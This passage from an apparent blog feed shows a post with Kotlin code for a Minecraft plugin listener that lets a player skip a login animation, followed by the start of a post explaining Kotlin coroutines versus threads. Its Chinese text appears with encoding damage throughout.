        <content type="html"><![CDATA[<p>è¿™ä¸ªä¸œè¥¿å…¶å®æ˜¯åœ¨çœ‹äº†æµ·èºå¤§ä½¬çš„åšå®¢(<a href="https://izzel.io/2020/02/12/chat-with-future/">å¦‚ä½•é—®ç©å®¶â€œå¾ä¸å¾å…¬å­°ç¾ï¼Ÿâ€ | IzzelAlizâ€™s Blog</a>)åæ‰äº†è§£çš„ï¼Œä½†åœ¨ä»Šå¤©ä¹‹å‰æˆ‘å…¶å®ä¸€ç›´åªæ˜¯åœ¨ç”¨å®ƒçš„å›è°ƒå‡½æ•°æ¥ç¡®ä¿æŸäº›æ“ä½œåœ¨ä¸€äº›è€—æ—¶åŠ¨ä½œæ‰§è¡Œå®Œåæ‰§è¡Œã€‚</p><p>ç›´åˆ°æ˜¨å¤©ä¸ºäº†åšä¸€ä¸ªç©å®¶æŒ‰é”®è·³è¿‡ç™»å…¥åŠ¨ç”»çš„åŠŸèƒ½ï¼Œæˆ‘åˆå»çœ‹äº†è¿™ç¯‡æ–‡ç« ã€‚ä¸å¾—ä¸è¯´ï¼Œ<strong>æµ·èºæ˜¯çœŸçš„ç‰›é€¼</strong></p><h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><p>æŒ‰ç…§æµ·èºåœ¨ä»–åšå®¢é‡Œæä¾›çš„æ€è·¯ï¼Œæˆ‘ç…§çŒ«ç”»è™æ•´äº†ä¸€ä¸ªç›‘å¬ç©å®¶æŒ‰é”®çš„åŠŸèƒ½ã€‚</p><p>åœ¨éœ€è¦ä¸ç©å®¶äº¤æµæ—¶æ³¨å†Œä¸€ä¸ªç›‘å¬å™¨ï¼Œäº¤æµå®Œæˆ–è€…è¶…æ—¶æ—¶å…³é—­è¿™ä¸ªæƒ³æ³•çœŸçš„ç‰›é€¼ã€‚æˆ‘çœŸæƒ³ä¸åˆ°</p><p><strong>ç›‘å¬å™¨ç±»</strong></p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">class</span> <span class="token function">AskSkipOrNot</span><span class="token punctuation">(</span><span class="token keyword">private</span> <span class="token keyword">val</span> uuid<span class="token operator">:</span> UUID<span class="token punctuation">,</span>                   <span class="token keyword">private</span> <span class="token keyword">val</span> future<span class="token operator">:</span> CompletableFuture<span class="token operator">&lt;</span>Boolean<span class="token operator">&gt;</span><span class="token punctuation">)</span> <span class="token operator">:</span> Listener <span class="token punctuation">{</span>    <span class="token annotation builtin">@EventHandler</span>    <span class="token keyword">fun</span> <span class="token function">e</span><span class="token punctuation">(</span>e<span class="token operator">:</span> PlayerInteractEvent<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>player<span class="token punctuation">.</span>uniqueId <span class="token operator">!=</span> uuid<span class="token punctuation">)</span> <span class="token keyword">return</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>SacredAuth<span class="token punctuation">.</span>conf<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"auth.display.skip-button"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">uppercase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"RIGHT"</span>            <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>action <span class="token operator">==</span> Action<span class="token punctuation">.</span>RIGHT_CLICK_AIR<span class="token punctuation">)</span> <span class="token punctuation">{</span>            future<span class="token punctuation">.</span><span class="token function">complete</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>            HandlerList<span class="token punctuation">.</span><span class="token function">unregisterAll</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>SacredAuth<span class="token punctuation">.</span>conf<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"auth.display.skip-button"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">uppercase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"LEFT"</span>            <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>action <span class="token operator">==</span> Action<span class="token punctuation">.</span>LEFT_CLICK_AIR<span class="token punctuation">)</span> <span class="token punctuation">{</span>            future<span class="token punctuation">.</span><span class="token function">complete</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>            HandlerList<span class="token punctuation">.</span><span class="token function">unregisterAll</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation builtin">@EventHandler</span>    <span class="token keyword">fun</span> <span class="token function">e</span><span class="token punctuation">(</span>e<span class="token operator">:</span> PlayerSwapHandItemsEvent<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>player<span class="token punctuation">.</span>uniqueId <span class="token operator">!=</span> uuid<span class="token punctuation">)</span> <span class="token keyword">return</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>SacredAuth<span class="token punctuation">.</span>conf<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"auth.display.skip-button"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">.</span><span class="token function">uppercase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"F"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            future<span class="token punctuation">.</span><span class="token function">complete</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>            HandlerList<span class="token punctuation">.</span><span class="token function">unregisterAll</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>åŠŸèƒ½</strong></p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">// å±•ç¤ºç™»å½•åŠ¨ç”»</span><span class="token keyword">fun</span> <span class="token function">toIconDisplayAnimation</span><span class="token punctuation">(</span>player<span class="token operator">:</span> Player<span class="token punctuation">,</span> func<span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> Unit <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    player<span class="token punctuation">.</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token string">"SacredAuth:icon-display"</span><span class="token punctuation">,</span> <span class="token function">FixedMetadataValue</span><span class="token punctuation">(</span>SacredAuth<span class="token punctuation">.</span>plugin<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> future <span class="token operator">=</span> CompletableFuture<span class="token operator">&lt;</span>Boolean<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> time <span class="token operator">=</span> conf<span class="token punctuation">.</span><span class="token function">getLong</span><span class="token punctuation">(</span><span class="token string">"auth.display.time"</span><span class="token punctuation">)</span>    KetherShell<span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>conf<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"auth.display.script.display"</span><span class="token punctuation">)</span><span class="token operator">!!</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        sender <span class="token operator">=</span> player    <span class="token punctuation">}</span>    <span class="token comment">// æ–¹æ³•</span>    <span class="token keyword">fun</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        player<span class="token punctuation">.</span><span class="token function">removeMetadata</span><span class="token punctuation">(</span><span class="token string">"SacredAuth:icon-display"</span><span class="token punctuation">,</span> SacredAuth<span class="token punctuation">.</span>plugin<span class="token punctuation">)</span>        KetherShell<span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>conf<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"auth.display.script.after-display"</span><span class="token punctuation">)</span><span class="token operator">!!</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            sender <span class="token operator">=</span> player        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    future<span class="token punctuation">.</span><span class="token function">thenRun</span> <span class="token punctuation">{</span>        <span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        func<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">val</span> listener <span class="token operator">=</span> <span class="token function">AskSkipOrNot</span><span class="token punctuation">(</span>player<span class="token punctuation">.</span>uniqueId<span class="token punctuation">,</span> future<span class="token punctuation">)</span>    Bukkit<span class="token punctuation">.</span><span class="token function">getPluginManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">registerEvents</span><span class="token punctuation">(</span>listener<span class="token punctuation">,</span> SacredAuth<span class="token punctuation">.</span>plugin<span class="token punctuation">)</span>    Tasks<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            future<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>time <span class="token operator">*</span> <span class="token number">50L</span><span class="token punctuation">,</span> TimeUnit<span class="token punctuation">.</span>MILLISECONDS<span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>ignored<span class="token operator">:</span> TimeoutException<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// è¿™é‡Œè²Œä¼¼futureå·²ç»è¢«ä¸­æ–­äº†ï¼Œå› ä¸ºè¶…æ—¶äº†ï¼Œæ‰€ä»¥futureå³ä½¿completeä¹Ÿä¸ä¼šæ‰§è¡Œä»–çš„å›è°ƒå‡½æ•°</span>            <span class="token comment">// future.complete(true)</span>            <span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            func<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äº†è§£äº†ä¸€ä¸‹Kotlinçš„åç¨‹</title>
      <link href="/2021/08/15/learn-kotlin-coroutine/"/>
      <url>/2021/08/15/learn-kotlin-coroutine/</url>
      
        <content type="html"><![CDATA[<h1 id="äº†è§£äº†ä¸€ä¸‹Kotlinçš„åç¨‹"><a href="#äº†è§£äº†ä¸€ä¸‹Kotlinçš„åç¨‹" class="headerlink" title="äº†è§£äº†ä¸€ä¸‹Kotlinçš„åç¨‹"></a>äº†è§£äº†ä¸€ä¸‹Kotlinçš„åç¨‹</h1><p>ç¡®å®éå¸¸èˆ’æœï¼Œä¸ªäººæ„Ÿè§‰æ¯”CompletableFutureæ–¹ä¾¿</p><p>æ‰€ä»¥æˆ‘æƒ³æŠŠä»Šå¤©å­¦åˆ°çš„åç¨‹ç›¸å…³çš„çŸ¥è¯†éƒ½è®°å½•ä¸‹æ¥</p><h2 id="åç¨‹æ˜¯ä»€ä¹ˆï¼Ÿèƒ½åšä»€ä¹ˆ-è·Ÿå¤šçº¿ç¨‹æœ‰ä»€ä¹ˆä¸ä¸€æ ·"><a href="#åç¨‹æ˜¯ä»€ä¹ˆï¼Ÿèƒ½åšä»€ä¹ˆ-è·Ÿå¤šçº¿ç¨‹æœ‰ä»€ä¹ˆä¸ä¸€æ ·" class="headerlink" title="åç¨‹æ˜¯ä»€ä¹ˆï¼Ÿèƒ½åšä»€ä¹ˆ? è·Ÿå¤šçº¿ç¨‹æœ‰ä»€ä¹ˆä¸ä¸€æ ·?"></a>åç¨‹æ˜¯ä»€ä¹ˆï¼Ÿèƒ½åšä»€ä¹ˆ? è·Ÿå¤šçº¿ç¨‹æœ‰ä»€ä¹ˆä¸ä¸€æ ·?</h2><h3 id="æ‘˜è‡ªç®€ä¹¦"><a href="#æ‘˜è‡ªç®€ä¹¦" class="headerlink" title="æ‘˜è‡ªç®€ä¹¦"></a>æ‘˜è‡ªç®€ä¹¦</h3><p><a href="https://www.jianshu.com/p/76d2f47b900d">åŸåœ°å€</a></p><blockquote><p><strong><a href="https://coldrain-moro.github.io/content.html?id=8">åç¨‹</a></strong> - ä¹Ÿå«å¾®çº¿ç¨‹ï¼Œæ˜¯ä¸€ç§æ–°çš„å¤šä»»åŠ¡å¹¶å‘çš„æ“ä½œæ‰‹æ®µ(ä¹Ÿä¸æ˜¯å¾ˆæ–°ï¼Œæ¦‚å¿µæ—©å°±æœ‰äº†)</p></blockquote><blockquote><ul><li>ç‰¹å¾ï¼šåç¨‹æ˜¯è¿è¡Œåœ¨å•çº¿ç¨‹ä¸­çš„å¹¶å‘ç¨‹åº</li><li>ä¼˜ç‚¹ï¼šçœå»äº†ä¼ ç»Ÿ Thread å¤šçº¿ç¨‹å¹¶å‘æœºåˆ¶ä¸­åˆ‡æ¢çº¿ç¨‹æ—¶å¸¦æ¥çš„çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ã€çº¿ç¨‹çŠ¶æ€åˆ‡&gt; &gt; æ¢ã€Thread åˆå§‹åŒ–ä¸Šçš„æ€§èƒ½æŸè€—ï¼Œèƒ½å¤§å¹…åº¦å”æé«˜å¹¶å‘æ€§èƒ½</li><li>æ¼«ç”»ç‰ˆæ¦‚å¿µè§£é‡Šï¼š<a href="https://links.jianshu.com/go?to=https://www.sohu.com/a/236536167_684445">æ¼«ç”»ï¼šä»€ä¹ˆæ˜¯åç¨‹ï¼Ÿ</a></li><li>ç®€å•ç†è§£ï¼šåœ¨å•çº¿ç¨‹ä¸Šç”±ç¨‹åºå‘˜è‡ªå·±è°ƒåº¦è¿è¡Œçš„å¹¶è¡Œè®¡ç®—</li></ul></blockquote><blockquote><p>ä¸‹é¢æ˜¯å…³äºåç¨‹è¿™ä¸ªæ¦‚å¿µçš„ä¸€äº›æè¿°ï¼š</p></blockquote><blockquote><blockquote><p>åç¨‹çš„å¼€å‘äººå‘˜ Roman Elizarov æ˜¯è¿™æ ·æè¿°åç¨‹çš„ï¼šåç¨‹å°±åƒéå¸¸è½»é‡çº§çš„çº¿ç¨‹ã€‚çº¿ç¨‹æ˜¯ç”±ç³»ç»Ÿè°ƒåº¦çš„ï¼Œçº¿ç¨‹åˆ‡æ¢æˆ–çº¿ç¨‹é˜»å¡çš„å¼€é”€éƒ½æ¯”è¾ƒå¤§ã€‚è€Œåç¨‹ä¾èµ–äºçº¿ç¨‹ï¼Œä½†æ˜¯åç¨‹æŒ‚èµ·æ—¶ä¸éœ€è¦é˜»å¡çº¿ç¨‹ï¼Œå‡ ä¹æ˜¯æ— ä»£ä»·çš„ï¼Œåç¨‹æ˜¯ç”±å¼€å‘è€…æ§åˆ¶çš„ã€‚æ‰€ä»¥åç¨‹ä¹Ÿåƒç”¨æˆ·æ€çš„çº¿ç¨‹ï¼Œéå¸¸è½»é‡çº§ï¼Œä¸€ä¸ªçº¿ç¨‹ä¸­å¯ä»¥åˆ›å»ºä»»æ„ä¸ªåç¨‹ã€‚</p></blockquote></blockquote><blockquote><blockquote><p>Coroutineï¼Œç¿»è¯‘æˆâ€åç¨‹â€œï¼Œåˆå§‹ç¢°åˆ°çš„äººé©¬ä¸Šå°±ä¼šè·Ÿè¿›ç¨‹å’Œçº¿ç¨‹ä¸¤ä¸ªæ¦‚å¿µè”ç³»èµ·æ¥ã€‚ç›´æ¥å…ˆè¯´åŒºåˆ«ï¼ŒCoroutineæ˜¯ç¼–è¯‘å™¨çº§çš„ï¼ŒProcesså’ŒThreadæ˜¯æ“ä½œç³»ç»Ÿçº§çš„ã€‚Coroutineçš„å®ç°ï¼Œé€šå¸¸æ˜¯å¯¹æŸä¸ªè¯­è¨€åšç›¸åº”çš„æè®®ï¼Œç„¶åé€šè¿‡åæˆç¼–è¯‘å™¨æ ‡å‡†ï¼Œç„¶åç¼–è¯‘å™¨å‚å•†æ¥å®ç°è¯¥æœºåˆ¶ã€‚Processå’ŒThreadçœ‹èµ·æ¥ä¹Ÿåœ¨è¯­è¨€å±‚æ¬¡ï¼Œä½†æ˜¯å†…ç”ŸåŸç†å´æ˜¯æ“ä½œç³»ç»Ÿå…ˆæœ‰è¿™ä¸ªä¸œè¥¿ï¼Œç„¶åé€šè¿‡ä¸€å®šçš„APIæš´éœ²ç»™ç”¨æˆ·ä½¿ç”¨ï¼Œä¸¤è€…åœ¨è¿™é‡Œæœ‰ä¸åŒã€‚Processå’ŒThreadæ˜¯osé€šè¿‡è°ƒåº¦ç®—æ³•ï¼Œä¿å­˜å½“å‰çš„ä¸Šä¸‹æ–‡ï¼Œç„¶åä»ä¸Šæ¬¡æš‚åœçš„åœ°æ–¹å†æ¬¡å¼€å§‹è®¡ç®—ï¼Œé‡æ–°å¼€å§‹çš„åœ°æ–¹ä¸å¯é¢„æœŸï¼Œæ¯æ¬¡CPUè®¡ç®—çš„æŒ‡ä»¤æ•°é‡å’Œä»£ç è·‘è¿‡çš„CPUæ—¶é—´æ˜¯ç›¸å…³çš„ï¼Œè·‘åˆ°osåˆ†é…çš„cpuæ—¶é—´åˆ°è¾¾åå°±ä¼šè¢«oså¼ºåˆ¶æŒ‚èµ·ã€‚Coroutineæ˜¯ç¼–è¯‘å™¨çš„é­”æœ¯ï¼Œé€šè¿‡æ’å…¥ç›¸å…³çš„ä»£ç ä½¿å¾—ä»£ç æ®µèƒ½å¤Ÿå®ç°åˆ†æ®µå¼çš„æ‰§è¡Œï¼Œé‡æ–°å¼€å§‹çš„åœ°æ–¹æ˜¯yieldå…³é”®å­—æŒ‡å®šçš„ï¼Œä¸€æ¬¡ä¸€å®šä¼šè·‘åˆ°ä¸€ä¸ªyieldå¯¹åº”çš„åœ°æ–¹</p></blockquote></blockquote><blockquote><blockquote><p>å¯¹äºå¤šçº¿ç¨‹åº”ç”¨ï¼ŒCPUé€šè¿‡åˆ‡ç‰‡çš„æ–¹å¼æ¥åˆ‡æ¢çº¿ç¨‹é—´çš„æ‰§è¡Œï¼Œçº¿ç¨‹åˆ‡æ¢æ—¶éœ€è¦è€—æ—¶ï¼ˆä¿å­˜çŠ¶æ€ï¼Œä¸‹æ¬¡ç»§ç»­ï¼‰ã€‚åç¨‹ï¼Œåˆ™åªä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹ï¼Œåœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­è§„å®šæŸä¸ªä»£ç å—æ‰§è¡Œé¡ºåºã€‚åç¨‹èƒ½ä¿ç•™ä¸Šä¸€æ¬¡è°ƒç”¨æ—¶çš„çŠ¶æ€ï¼Œä¸éœ€è¦åƒçº¿ç¨‹ä¸€æ ·ç”¨å›è°ƒå‡½æ•°ï¼Œæ‰€ä»¥æ€§èƒ½ä¸Šä¼šæœ‰æå‡ã€‚ç¼ºç‚¹æ˜¯æœ¬è´¨æ˜¯ä¸ªå•çº¿ç¨‹ï¼Œä¸èƒ½åˆ©ç”¨åˆ°å•ä¸ªCPUçš„å¤šä¸ªæ ¸</p></blockquote></blockquote><blockquote><p><strong><a href="https://coldrain-moro.github.io/content.html?id=8">åç¨‹å’Œçº¿ç¨‹çš„å¯¹æ¯”ï¼š</a></strong></p></blockquote><blockquote><ul><li><strong><a href="https://coldrain-moro.github.io/content.html?id=8">Thread</a></strong> - çº¿ç¨‹æ‹¥æœ‰ç‹¬ç«‹çš„æ ˆã€å±€éƒ¨å˜é‡ï¼ŒåŸºäºè¿›ç¨‹çš„å…±äº«å†…å­˜ï¼Œå› æ­¤æ•°æ®å…±äº«æ¯”è¾ƒå®¹æ˜“ï¼Œä½†æ˜¯å¤šçº¿ç¨‹æ—¶éœ€è¦åŠ é”æ¥è¿›è¡Œè®¿é—®æ§åˆ¶ï¼Œä¸åŠ é”å°±å®¹æ˜“å¯¼è‡´æ•°æ®é”™è¯¯ï¼Œä½†åŠ é”è¿‡å¤šåˆå®¹æ˜“å‡ºç°æ­»é”ã€‚çº¿ç¨‹ä¹‹é—´çš„è°ƒåº¦ç”±å†…æ ¸æ§åˆ¶(æ—¶é—´ç‰‡ç«äº‰æœºåˆ¶)ï¼Œç¨‹åºå‘˜æ— æ³•ä»‹å…¥æ§åˆ¶(<code>å³ä¾¿æˆ‘ä»¬æ‹¥æœ‰sleepã€yieldè¿™æ ·çš„APIï¼Œè¿™äº›APIåªæ˜¯çœ‹èµ·æ¥åƒï¼Œä½†æœ¬è´¨è¿˜æ˜¯äº¤ç»™å†…æ ¸å»æ§åˆ¶ï¼Œæˆ‘ä»¬æœ€å¤šå°±æ˜¯åŠ ä¸Šå‡ ä¸ªæ¡ä»¶æ§åˆ¶ç½¢äº†</code>)ï¼Œçº¿ç¨‹ä¹‹é—´çš„åˆ‡æ¢éœ€è¦æ·±å…¥åˆ°å†…æ ¸çº§åˆ«ï¼Œå› æ­¤çº¿ç¨‹çš„åˆ‡æ¢ä»£ä»·æ¯”è¾ƒå¤§ï¼Œè¡¨ç°åœ¨ï¼š<br>* çº¿ç¨‹å¯¹è±¡çš„åˆ›å»ºå’Œåˆå§‹åŒ–<br>* çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢<br>* çº¿ç¨‹çŠ¶æ€çš„åˆ‡æ¢ç”±ç³»ç»Ÿå†…æ ¸å®Œæˆ<br>* å¯¹å˜é‡çš„æ“ä½œéœ€è¦åŠ é”</li></ul></blockquote><p><a href="https://coldrain-moro.github.io/content.html?id=8"><img src="https://coldrain-moro.github.io/content.html?id=8" alt="img"></a></p><blockquote><ul><li><strong><a href="https://coldrain-moro.github.io/content.html?id=8">Coroutine</a></strong> åç¨‹æ˜¯è·‘åœ¨çº¿ç¨‹ä¸Šçš„ä¼˜åŒ–äº§ç‰©ï¼Œè¢«ç§°ä¸ºè½»é‡çº§ Threadï¼Œæ‹¥æœ‰è‡ªå·±çš„æ ˆå†…å­˜å’Œå±€éƒ¨å˜é‡ï¼Œå…±äº«æˆå‘˜å˜é‡ã€‚ä¼ ç»Ÿ Thread æ‰§è¡Œçš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªwhile(true) çš„å‡½æ•°ï¼Œæœ¬è´¨å°±æ˜¯ä¸€ä¸ªè€—æ—¶å‡½æ•°ï¼ŒCoroutine å¯ä»¥ç”¨æ¥ç›´æ¥æ ‡è®°æ–¹æ³•ï¼Œç”±ç¨‹åºå‘˜è‡ªå·±å®ç°åˆ‡æ¢ï¼Œè°ƒåº¦ï¼Œä¸å†é‡‡ç”¨ä¼ ç»Ÿçš„æ—¶é—´æ®µç«äº‰æœºåˆ¶ã€‚åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸Šå¯ä»¥åŒæ—¶è·‘å¤šä¸ªåç¨‹ï¼ŒåŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªåç¨‹è¢«æ‰§è¡Œï¼Œåœ¨å•çº¿ç¨‹ä¸Šæ¨¡æ‹Ÿå¤šçº¿ç¨‹å¹¶å‘ï¼Œåç¨‹ä½•æ—¶è¿è¡Œï¼Œä½•æ—¶æš‚åœï¼Œéƒ½æ˜¯æœ‰ç¨‹åºå‘˜è‡ªå·±å†³å®šçš„ï¼Œä½¿ç”¨ï¼š <code>yield/resume</code> APIï¼Œä¼˜åŠ¿å¦‚ä¸‹ï¼š</li></ul></blockquote><blockquote><ul><li>å› ä¸ºåœ¨åŒä¸€ä¸ªçº¿ç¨‹é‡Œï¼Œåç¨‹ä¹‹é—´çš„åˆ‡æ¢ä¸æ¶‰åŠçº¿ç¨‹ä¸Šä¸‹æ–‡çš„åˆ‡æ¢å’Œçº¿ç¨‹çŠ¶æ€çš„æ”¹å˜ï¼Œä¸å­˜åœ¨èµ„æºã€æ•°æ®å¹¶å‘ï¼Œæ‰€ä»¥ä¸ç”¨åŠ é”ï¼Œåªéœ€è¦åˆ¤æ–­çŠ¶æ€å°±OKï¼Œæ‰€ä»¥æ‰§è¡Œæ•ˆç‡æ¯”å¤šçº¿ç¨‹é«˜å¾ˆå¤š</li></ul></blockquote><blockquote><ul><li>åç¨‹æ˜¯éé˜»å¡å¼çš„(ä¹Ÿæœ‰é˜»å¡API)ï¼Œä¸€ä¸ªåç¨‹åœ¨è¿›å…¥é˜»å¡åä¸ä¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œå½“å‰çº¿ç¨‹ä¼šå»æ‰§è¡Œå…¶ä»–åç¨‹ä»»åŠ¡</li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">![img](https:////upload-images.jianshu.io/upload_images/1785445-57bc06c143e5fcc9.jpeg?imageMogr2/auto-orient/strip|imageView2/2/w/724/format/webp)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>ç¨‹åºå‘˜èƒ½å¤Ÿæ§åˆ¶åç¨‹çš„åˆ‡æ¢ï¼Œæ˜¯é€šè¿‡<code>yield</code> API è®©åç¨‹åœ¨ç©ºé—²æ—¶ï¼ˆæ¯”å¦‚ç­‰å¾…ioï¼Œç½‘ç»œæ•°æ®æœªåˆ°è¾¾ï¼‰æ”¾å¼ƒæ‰§è¡Œæƒï¼Œç„¶ååœ¨åˆé€‚çš„æ—¶æœºå†é€šè¿‡<code>resume</code> API å”¤é†’åç¨‹ç»§ç»­è¿è¡Œã€‚åç¨‹ä¸€æ—¦å¼€å§‹è¿è¡Œå°±ä¸ä¼šç»“æŸï¼Œç›´åˆ°é‡åˆ°<code>yield</code>äº¤å‡ºæ‰§è¡Œæƒã€‚<code>Yield</code>ã€<code>resume</code> è¿™ä¸€å¯¹ API å¯ä»¥éå¸¸ä¾¿æ·çš„å®ç°<code>å¼‚æ­¥</code>ï¼Œè¿™å¯æ˜¯ç›®å‰æ‰€æœ‰é«˜çº§è¯­æ³•å­œå­œä¸å€¦è¿½æ±‚çš„</p></blockquote><blockquote><p>æ‹¿ python ä»£ç ä¸¾ä¸ªä¾‹å­ï¼Œåœ¨ä¸€ä¸ªçº¿ç¨‹é‡Œè¿è¡Œä¸‹é¢2ä¸ªæ–¹æ³•ï¼š</p></blockquote><blockquote><pre class="line-numbers language-none"><code class="language-none">def A():print '1'print '2print '3'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><pre class="line-numbers language-none"><code class="language-none">def B(): print 'x' print 'y' print 'z'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><p>å‡è®¾ç”±åç¨‹æ‰§è¡Œï¼Œæ¯ä¸ªæ–¹æ³•éƒ½ç”¨åç¨‹æ ‡è®°ï¼Œåœ¨æ‰§è¡ŒAçš„è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥éšæ—¶ä¸­æ–­ï¼Œå»æ‰§è¡ŒBï¼ŒBä¹Ÿå¯&gt; &gt; èƒ½åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¸­æ–­å†å»æ‰§è¡ŒAï¼Œç»“æœå¯èƒ½æ˜¯ï¼š1 2 x y 3 z</p></blockquote><h3 id="åç¨‹ä¼˜ç‚¹ä¹‹æˆ‘è§"><a href="#åç¨‹ä¼˜ç‚¹ä¹‹æˆ‘è§" class="headerlink" title="åç¨‹ä¼˜ç‚¹ä¹‹æˆ‘è§"></a>åç¨‹ä¼˜ç‚¹ä¹‹æˆ‘è§</h3><ul><li><p>åç¨‹æ“ä½œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹æ¯”å¤šçº¿ç¨‹æ“ä½œæ€§èƒ½å¥½</p></li><li><p>å†™èµ·æ¥å¾ˆçˆ½ï¼Œé…åˆawaitä½ å†™å¼‚æ­¥æ“ä½œå°±è·Ÿå†™åŒæ­¥æ“ä½œä¸€æ ·</p></li><li><p>ç›¸æ¯”äºCompletableFutureæ›´å‰å®³çš„åœ°æ–¹åœ¨äºå®ƒå¯ä»¥ä¸­æ–­çº¿ç¨‹ï¼Œä¸€ä¼šå„¿è¿‡åå†ç»§ç»­æ‰§è¡Œï¼Œ<strong>æ“ä½œæ–¹å¼æ›´åŠ 